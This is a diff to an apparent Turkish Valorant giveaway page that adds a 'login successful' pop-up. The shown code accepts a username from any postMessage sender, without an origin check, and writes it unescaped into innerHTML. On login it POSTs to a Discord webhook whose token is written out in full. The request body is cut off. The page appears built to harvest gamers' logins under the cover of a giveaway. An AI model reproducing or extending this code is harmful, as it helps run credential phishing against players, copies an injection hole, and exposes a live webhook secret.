@@ -23,12 +23,22 @@
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
         
-        /* Profil Alanı Stilleri */
         .user-profile { display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.03); padding: 5px 15px; border-radius: 8px; border: 1px solid #79eb1e; }
         .user-avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #79eb1e; object-fit: cover; }
         .user-info { display: flex; flex-direction: column; }
         .user-name { color: #79eb1e; font-weight: 900; font-size: 14px; }
         .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
+
+        /* Bildirim Kutusu Stili */
+        #notification-box { 
+            position: fixed; bottom: 20px; right: -400px; 
+            background: #111420; border-left: 4px solid #79eb1e; 
+            padding: 15px 25px; border-radius: 4px; z-index: 10000; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex; align-items: center; gap: 15px;
+        }
+        #notification-box.active { right: 20px; }
+        .notif-icon { color: #79eb1e; font-size: 20px; font-weight: 900; }
 
         .giveaway-section { max-width: 1100px; margin: 30px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 25px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
@@ -54,6 +64,14 @@
     </style>
 </head>
 <body>
+
+    <div id="notification-box">
+        <div class="notif-icon">✓</div>
+        <div>
+            <div style="font-weight: 800; color: #fff; font-size: 14px;">GİRİŞ BAŞARILI</div>
+            <div style="color: #888; font-size: 12px;" id="notif-text">Hoş geldin, kullanıcı!</div>
+        </div>
+    </div>
 
     <div class="live-drops">
         <div class="mythic-label">CANLI DROPLAR</div>
@@ -212,7 +230,7 @@
             if(e.data && e.data.u) {
                 IS_LOGGED = true;
                 
-                // Sağ üst profil alanını güncelle
+                // Profil güncelleme
                 document.getElementById('authArea').innerHTML = `
                     <div class="user-profile">
                         <img src="avatar.png" class="user-avatar" onerror="this.src='https://ui-avatars.com/api/?name=${e.data.u}&background=ff4655&color=fff'">
@@ -222,9 +240,17 @@
                     </div>
                 `;
                 
+                // Bildirim Kutusu Tetikleme
+                const notif = document.getElementById('notification-box');
+                document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u}!`;
+                notif.classList.add('active');
+                setTimeout(() => { notif.classList.remove('active'); }, 5000);
+
                 document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
                 document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
                 loadCases();
+
+                // Discord Webhook
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
